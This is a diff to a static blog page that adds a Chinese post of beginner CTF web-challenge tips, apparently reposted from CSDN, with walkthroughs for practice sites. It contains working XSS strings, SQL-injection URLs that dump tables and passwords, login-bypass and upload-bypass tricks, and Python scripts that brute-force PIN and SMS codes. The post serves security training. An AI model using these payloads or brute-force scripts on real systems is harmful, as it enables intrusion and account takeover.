@@ -262,6 +262,327 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/15/ctf的web技巧/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Thegonedays">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://meitu.qqzong.com/uploads/allimg/c141011/1412a54O404Z-52U17.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="to be better">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/04/15/ctf的web技巧/" itemprop="url">ctf的web技巧</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-15T10:37:28+08:00">
+                2018-04-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index">
+                    <span itemprop="name">-ctf</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>##基础篇<br>1.直接查看源代码</p>
+<p><a href="http://lab1.xseclab.com/base1_4a4d993ed7bd7d467b27af52d2aaa800/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base1_4a4d993ed7bd7d467b27af52d2aaa800/index.php</a></p>
+<p>2.修改或添加HTTP请求头</p>
+<p>常见的有：</p>
+<p>Referer来源伪造</p>
+<p>X-Forwarded-For：ip伪造</p>
+<p>User-Agent：用户代理（就是用什么浏览器什么的）</p>
+<p><a href="http://lab1.xseclab.com/base6_6082c908819e105c378eb93b6631c4d3/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base6_6082c908819e105c378eb93b6631c4d3/index.php</a></p>
+<p>//.net的版本修改，后面添加，如版本9</p>
+<p>.NET CLR 9</p>
+<p>Accept-Language：语言</p>
+<p><a href="http://lab1.xseclab.com/base1_0ef337f3afbe42d5619d7a36c19c20ab/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base1_0ef337f3afbe42d5619d7a36c19c20ab/index.php</a><br> <a href="http://ctf1.shiyanbar.com/basic/header/" target="_blank" rel="noopener">http://ctf1.shiyanbar.com/basic/header/</a></p>
+<p>Cookie的修改</p>
+<p><a href="http://lab1.xseclab.com/base9_ab629d778e3a29540dfd60f2e548a5eb/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base9_ab629d778e3a29540dfd60f2e548a5eb/index.php</a></p>
+<p>3.查看HTTP请求头或响应头</p>
+<p><a href="http://lab1.xseclab.com/base7_eb68bd2f0d762faf70c89799b3c1cc52/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base7_eb68bd2f0d762faf70c89799b3c1cc52/index.php</a><br> <a href="http://ctf1.shiyanbar.com/basic/catch/" target="_blank" rel="noopener">http://ctf1.shiyanbar.com/basic/catch/</a></p>
+<p>4.302跳转的中转网页有信息</p>
+<p><a href="http://lab1.xseclab.com/base8_0abd63aa54bef0464289d6a42465f354/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base8_0abd63aa54bef0464289d6a42465f354/index.php</a></p>
+<p>5.查看开发者工具控制台</p>
+<p>6.javascript代码绕过</p>
+<p>通过删除或修改代码或者本地代理改包绕过</p>
+<p><a href="http://lab1.xseclab.com/base10_0b4e4866096913ac9c3a2272dde27215/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base10_0b4e4866096913ac9c3a2272dde27215/index.php</a></p>
+<p>7.使用burp的repeater查看整个HTTP包</p>
+<p><a href="http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/index.php</a></p>
+<p>8.阅读javascript代码，直接控制台获取正确密码</p>
+<p><a href="http://ctf1.shiyanbar.com/basic/js/index.asp" target="_blank" rel="noopener">http://ctf1.shiyanbar.com/basic/js/index.asp</a></p>
+<p>9.robots.txt文件获取信息</p>
+<p>这本来是给搜索引擎看的信息，很可能暴露网站结构目录</p>
+<p><a href="http://lab1.xseclab.com/base12_44f0d8a96eed21afdc4823a0bf1a316b/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/base12_44f0d8a96eed21afdc4823a0bf1a316b/index.php</a></p>
+<p>10..bash_history，这个应该说看到过吧，就是记录用户输入过的linux命令的</p>
+<p>前端脚本类</p>
+<p>js加解密</p>
+<p><a href="http://ctf5.shiyanbar.com/DUTCTF/1.html" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/DUTCTF/1.html</a>  //直接在F12控制台粘贴就有了</p>
+<p>XSS</p>
+<p><a href="http://lab1.xseclab.com/realxss1_f123c17dd9c363334670101779193998/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/realxss1_f123c17dd9c363334670101779193998/index.php</a></p>
+<p>这题题目就有漏洞，直接在命令行输入下面的就有了</p>
+<p>[javascript] view plain copy<br>1.$.post(“./getkey.php?ok=1”,{‘url’:location.href,’ok’:ok},function(data){  </p>
+<ol start="2">
+<li>console.log(data);  </li>
+<li>});<br>4.showkey();  </li>
+</ol>
+<p>当然简单的直接输入</p>
+<p>[javascript] view plain copy<br>1.<script>alert(HackingLab)</script>  </p>
+<p>这样也可以</p>
+<p> 这题也差不多<br><a href="http://lab1.xseclab.com/realxss2_bcedaba7e8618cdfb51178765060fc7d/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/realxss2_bcedaba7e8618cdfb51178765060fc7d/index.php</a></p>
+<p>可以直接输入上题的那个jquery，也可以乖乖下面的</p>
+<p>[html] view plain copy<br>1.<img src="11" onerror="alert(HackingLab)">  </p>
+<p> <a href="http://lab1.xseclab.com/realxss3_9b28b0ff93d0b0099f5ac7f8bad3f368/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/realxss3_9b28b0ff93d0b0099f5ac7f8bad3f368/index.php</a></p>
+<p>后端脚本类</p>
+<p>代码审计</p>
+<p>asp代码审计：</p>
+<p>1.<a href="http://ctf8.shiyanbar.com/aspaudit/" target="_blank" rel="noopener">http://ctf8.shiyanbar.com/aspaudit/</a> </p>
+<p>长度限制:F12删maxlength，或者改长度，本地代理都可以绕过</p>
+<p>//Username：  ‘union  select 1,1,1 from bdmin ‘  ，为什么是三列呢，一般表中都会设置id，加上账号密码就3个了，不行就猜4列咯…，因为union的之前的用户名为空，所以前面的结果集为空，所以最后的结果集只有我们后面的1,1,1了，所以在密码那输入1就是密码。</p>
+<p>这样也行，反正就闭合标签   ‘union  select 1,1,1 from bdmin where ‘1’=’1</p>
+<p>php代码审计</p>
+<p>1.<a href="http://ctf8.shiyanbar.com/phpaudit/" target="_blank" rel="noopener">http://ctf8.shiyanbar.com/phpaudit/</a> //其实这个就是修改http请求头的X-Forwarded-For</p>
+<p>2.<a href="http://ctf1.shiyanbar.com/web/4/index.php" target="_blank" rel="noopener">http://ctf1.shiyanbar.com/web/4/index.php</a> //跟下面的后台登陆型第一个一样，请看下面的后台登陆型第一个</p>
+<p>3.<a href="http://ctf5.shiyanbar.com/DUTCTF/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/DUTCTF/index.php</a> //二次urlencode</p>
+<p>4.<a href="http://ctf1.shiyanbar.com/web/5/index.php" target="_blank" rel="noopener">http://ctf1.shiyanbar.com/web/5/index.php</a> //请看后台登陆型第二个</p>
+<p>5.<a href="http://ctf4.shiyanbar.com/web/false.php" target="_blank" rel="noopener">http://ctf4.shiyanbar.com/web/false.php</a> //数组的哈希值，都是null</p>
+<p>6.<a href="http://ctf4.shiyanbar.com/web/Session.php" target="_blank" rel="noopener">http://ctf4.shiyanbar.com/web/Session.php</a> //只需要在第一次提交的时候直接提交password=即可，因为第一次访问时服务器那边也没设置对应的$_SESSION[‘password’]，由于是==比较，两者是相等的。</p>
+<p>表单隐藏 <a href="http://ctf10.shiyanbar.com:8888/main.php" target="_blank" rel="noopener">http://ctf10.shiyanbar.com:8888/main.php</a></p>
+<p>sql注入</p>
+<p>简单的直接上工具就ko了，如sqlmap，等-——10大sql注入工具</p>
+<p>如下面几个：</p>
+<p>1.<a href="http://ctf5.shiyanbar.com:8080/9/asp.asp" target="_blank" rel="noopener">http://ctf5.shiyanbar.com:8080/9/asp.asp</a></p>
+<p>2.<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1</a></p>
+<p>当然不用and XX也是可以的，下面只是举个例子</p>
+<p>[php] view plain copy<br>1.//手工注入过程<br>2.//判断注入类型为and布尔型注入<br>3.<a href="http://ctf5.shiyanbar.com/8/index.php?id=1%20and%201=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1%20and%201=1</a><br>4.<a href="http://ctf5.shiyanbar.com/8/index.php?id=1%20and%201=2" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1%20and%201=2</a><br>5.//判断字段数<br>6.<a href="http://ctf5.shiyanbar.com/8/index.php?id=1%20order%20by%203" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1%20order%20by%203</a><br>7.<a href="http://ctf5.shiyanbar.com/8/index.php?id=1%20order%20by%202" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1%20order%20by%202</a><br>8.//获取数据库基本信息(//concat_ws是字符串连接函数，其中第一个参数是分隔符，CHAR(58)是冒号，因为冒号的ASCII是58)<br>9.<a href="http://ctf5.shiyanbar.com/8/index.php?id=1%20and%201=2%20union%20select%201,concat_ws(CHAR(58),user(),database(),version()" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1%20and%201=2%20union%20select%201,concat_ws(CHAR(58),user(),database(),version()</a>)<br>10.//获取数据库中的表,其中table_schema可以理解为数据库吧(他是mysql系统表里面的一个字段，这里我们用16进制表示，就是上一句查询到的数据库)<br>11.<a href="http://ctf5.shiyanbar.com/8/index.php?id=1%20and%201=2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=0x6d795f6462" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1%20and%201=2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=0x6d795f6462</a><br>12.//获取重要表的字段<br>13.<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1</a> and 1=2 union select 1,column_name from information_schema.columns where table_name=0x746869736b6579<br>14.//获取表中的内容<br>15.<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1</a> and 1=2 union select 1,k0y from thiskey  </p>
+<p>3.<a href="http://lab1.xseclab.com/sqli2_3265b4852c13383560327d1c31550b60/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/sqli2_3265b4852c13383560327d1c31550b60/index.php</a></p>
+<p>密码随便输入<br>！<a href="https://img-blog.csdn.net/20160604203641708?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" target="_blank" rel="noopener">1</a><br>4.<a href="http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php</a></p>
+<p>payload：</p>
+<p><a href="http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1" target="_blank" rel="noopener">http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1</a> or 1=1</p>
+<p>5.<a href="http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1" target="_blank" rel="noopener">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1</a></p>
+<p>宽字节注入，在其他没头绪的时候必须考虑这个了，哎，而且题目都说过滤了</p>
+<p>还有响应头：Content-Type：text/html; charset=gb2312<br> payload<br> <a href="http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%a0%27" target="_blank" rel="noopener">http://lab1.xseclab.com/sqli4_9b5a929e00e122784e44eddf2b6aa1a0/index.php?id=1%a0%27</a> or 1=1 limit 2,1%23</p>
+<p>6.<a href="http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0&amp;num=1" target="_blank" rel="noopener">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0&amp;num=1</a></p>
+<p>利用报错注入</p>
+<p><a href="http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=7&amp;num=1" target="_blank" rel="noopener">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=7&amp;num=1</a> procedure analyse(extractvalue(1,concat(0x3a,database())),1)     </p>
+<p>数据库：mydbs</p>
+<p><a href="http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=7&amp;num=1" target="_blank" rel="noopener">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=7&amp;num=1</a> procedure analyse(extractvalue(1,concat(0x3a,(select table_name from information_schema.tables where table_schema=0x6d79646273 limit 0,1 ))),1)</p>
+<p>爆表</p>
+<p><a href="http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=7&amp;num=1" target="_blank" rel="noopener">http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=7&amp;num=1</a> procedure analyse(extractvalue(1,concat(0x3a,(select concat(username,0x3a,password) from user limit 2,1 ))),1)</p>
+<p>爆数据</p>
+<p>写点脚本的</p>
+<p>注意看响应头，You must do it as fast as you can!，这个手速是不行的，必须编程获取后解码，跟着post数据：key=XXXXXXXXXXXXX</p>
+<p><a href="http://ctf4.shiyanbar.com/web/10.php" target="_blank" rel="noopener">http://ctf4.shiyanbar.com/web/10.php</a></p>
+<p>脚本如下</p>
+<p>[python] view plain copy<br>1.import requests<br>2.import base64  </p>
+<ol start="3">
+<li>4.url=’<a href="http://ctf4.shiyanbar.com/web/10.php&#39;" target="_blank" rel="noopener">http://ctf4.shiyanbar.com/web/10.php&#39;</a><br>5.req=requests.get(url)<br>6.print req.text<br>7.key=req.headers[‘FLAG’]<br>8.key=base64.b64decode(key)<br>9.key=key.split(‘:’)[1].strip()<br>10.data={‘key’:key}<br>11.r=requests.post(url,data=data)<br>12.print(r.text)  </li>
+</ol>
+<p>后台登陆型</p>
+<p>给了源代码，主要看sql语句，注释掉后面的and (pw=’$pass’)，当注意闭合小括号 payload  ：user=admin’)#&amp;pass=432142</p>
+<p>1.<a href="http://ctf1.shiyanbar.com/web/4/index.php" target="_blank" rel="noopener">http://ctf1.shiyanbar.com/web/4/index.php</a></p>
+<p>2.<a href="http://ctf1.shiyanbar.com/web/5/index.php" target="_blank" rel="noopener">http://ctf1.shiyanbar.com/web/5/index.php</a></p>
+<p>//这题可以看看asp代码审计第一题，你或许有思路，后面有答案鼠标刮过即可（鼠标选中冒号后面的空白）：user=’ union select ‘c4ca4238a0b923820dcc509a6f75849b’  from php – &amp;pass=1</p>
+<p>那个MD5是密码1的md5</p>
+<p>代码逆向</p>
+<p><a href="http://www.shiyanbar.com/ctf/1760" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/1760</a></p>
+<p>解密代码</p>
+<p>[cpp] view plain copy<br>1.$cipher = ‘a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws’;<br>2.$tmp = base64_decode(strrev(str_rot13($cipher)));<br>3.echo $tmp;<br>4.$b = ‘’;<br>5.for ($i=0; $i &lt; strlen($tmp); $i++) {   </p>
+<ol start="6">
+<li>$a = substr($tmp, $i, 1);  </li>
+<li>$b = $b.chr(ord($a)-1);<br>8.}<br>9.echo strrev($b);  </li>
+</ol>
+<p>上传绕过类</p>
+<p><a href="http://ctf4.shiyanbar.com/web/upload" target="_blank" rel="noopener">http://ctf4.shiyanbar.com/web/upload</a>  //这个注意看抓包的数据，既有路径，又有文件名，文件名不行，就试试路径的00截断   /uploads/sdf.php+十六进制的00</p>
+<p>multipart/form-data大写绕过</p>
+<p>php的特性</p>
+<p>1.数字与字符串比较</p>
+<p>[php] view plain copy<br>1.var_dump( 0 == “a” );<br>2.var_dump( “0” == “a” );  </p>
+<p>第一个返回的是 true ，第二个返回的是 false<br>因为php把字母开头的转化为整型时，转化为0， 前面数字后面字母的话就只取到第一个字母出现的位置之前（如intval(‘’123abd45gf)结果为123）</p>
+<p>2.md5“碰撞”</p>
+<p>因为php 0e开头的字符串都是==的，不是===哦</p>
+<p>[php] view plain copy<br>1.var_dump(“0e462097431906854”==”0e83040041”);  </p>
+<p>上面这个返回true，如果题目的md5是0e开头的，你懂的<br>下面给一组数据吧</p>
+<p>[php] view plain copy<br>1.md5(‘240610708’) 的结果是：0e462097431906509019562988736854<br>2.md5(‘QNKCDZO’) 的结果是：0e830400451993494058024219903391  </p>
+<p>240610708、QNKCDZO、aabg7XSs、aabC9RqS</p>
+<p>3.md5数组</p>
+<p>md5(array) == NULL</p>
+<p>4.strcmp(array,string) ==</p>
+<p>5.变量覆盖：register_globals的意思就是注册为全局变量，所以当On的时候，传递过来的值会被直接的注册为全局变量直接使用，而Off的时候，我们需要到特定的数组里去得到它。PHP4默认开启，PHP5以后默认关闭。<br> 还有就是extract那个函数，也可以存在变量覆盖<a href="http://www.w3school.com.cn/php/func_array_extract.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_array_extract.asp</a></p>
+<p> 6.ereg函数漏洞：00截断<br>%00</p>
+<p><a href="http://www.shiyanbar.com/ctf/1805" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/1805</a></p>
+<p>备份文件类型的</p>
+<p>.bak   ultroedit….</p>
+<p>~</p>
+<p>.xxxx.php.swp  .xxxx.php.swo    vim</p>
+<p>验证码类的</p>
+<p><a href="http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php</a></p>
+<p>这个验证码的特点是，在一次会话中，下一次提交，上一次的验证码不会失效</p>
+<p>代码，具体要改cookie和验证码</p>
+<p>[python] view plain copy<br>1.import requests  </p>
+<ol start="2">
+<li>3.url = “<a href="http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php&quot;" target="_blank" rel="noopener">http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php&quot;</a><br>4.req = requests.session()<br>5.header = {“Cookie”:”PHPSESSID=9b8f8686269f5d70a44766e3c5f4dcdc”}<br>6.for pwd in xrange(1000,10000):  </li>
+<li></li>
+<li>data={‘username’:’admin’,’pwd’:pwd,’vcode’:’c3pe’}  </li>
+<li></li>
+<li>ret = req.post(url, data=data, headers=header)  </li>
+<li>print ret.text  </li>
+<li>if ‘error’ not in ret.text:  </li>
+<li>print pwd  </li>
+<li>break<br><img src="https://img-blog.csdn.net/20160521210916078?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="2"><br><img src="https://img-blog.csdn.net/20160521210921577?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="3"><br><a href="http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/index.php</a></li>
+</ol>
+<p>程序猿：“该死的黑客，我让你绕！我验证一次就让你的验证码失效，看你怎么绕！”</p>
+<p>这一关的验证码，验证一次以后就失效了，但是再次提交的时候就不需要再考虑验证码是否正确的问题了，所以在脚本中只要保证验证码为’’的就可以</p>
+<p>[python] view plain copy<br>1.import requests  </p>
+<ol start="2">
+<li>3.url = “<a href="http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/login.php&quot;" target="_blank" rel="noopener">http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/login.php&quot;</a><br>4.req = requests.session()<br>5.header = {“Cookie”:”PHPSESSID=3c39940da50b514038b3e9971ee5f57e”}  </li>
+<li>7.for pwd in xrange(1000,10000):  </li>
+<li>data={‘username’:’admin’,’pwd’:pwd,’vcode’:’’}  </li>
+<li>ret = req.post(url, data=data, headers=header)  </li>
+<li></li>
+<li>if ‘error’ not in ret.text:  </li>
+<li>print ret.text  </li>
+<li>print “good: password is:” + str(pwd)  </li>
+<li>break  </li>
+<li>else:  </li>
+<li>print “try:” + str(pwd) + “ and result is :”+ ret.text  </li>
+</ol>
+<p><a href="http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/index.php" target="_blank" rel="noopener">http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/index.php</a>  跟上面一样的脚本</p>
+<p><a href="http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/" target="_blank" rel="noopener">http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/</a></p>
+<p>爆破再爆破，点击验证码再运行脚本哦，跟着获得另一个手机号，再获取验证码，再修改手机号再运行脚本</p>
+<p>[python] view plain copy<br>1.import requests  </p>
+<ol start="2">
+<li>3.url = “<a href="http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/login.php&quot;" target="_blank" rel="noopener">http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/login.php&quot;</a><br>4.req = requests.session()<br>5.header = {“Cookie”:”PHPSESSID=61556a5b2a6c2a03a2f35b199cbb5364”}<br>6.for vcode in xrange(100,1000):  </li>
+<li>data={‘username’:’13388886666’,’vcode’:vcode, ‘Login’:’submit’}  </li>
+<li><h1 id="data-‘username’-’13399999999’-’vcode’-vcode-‘Login’-’submit’"><a href="#data-‘username’-’13399999999’-’vcode’-vcode-‘Login’-’submit’" class="headerlink" title="data={‘username’:’13399999999’,’vcode’:vcode, ‘Login’:’submit’}"></a>data={‘username’:’13399999999’,’vcode’:vcode, ‘Login’:’submit’}</h1></li>
+<li>ret = req.post(url, data=data, headers=header)  </li>
+<li></li>
+<li>if ‘error’ not in ret.text:  </li>
+<li>print ret.text  </li>
+<li>print “good: vcode is:” + str(vcode)  </li>
+<li>break  </li>
+<li>else:  </li>
+<li>print “try:” + str(vcode) + “ and result is :”+ ret.text  </li>
+</ol>
+<p>本文链接：<a href="http://blog.csdn.net/u012763794/article/details/50959166" target="_blank" rel="noopener">http://blog.csdn.net/u012763794/article/details/50959166</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/08/实验吧ctf/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -882,7 +1203,7 @@ respository: https://github.com/xxx/xxx.github.io.git#就是github的仓库地�
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -893,7 +1214,7 @@ respository: https://github.com/xxx/xxx.github.io.git#就是github的仓库地�
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -904,7 +1225,7 @@ respository: https://github.com/xxx/xxx.github.io.git#就是github的仓库地�
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
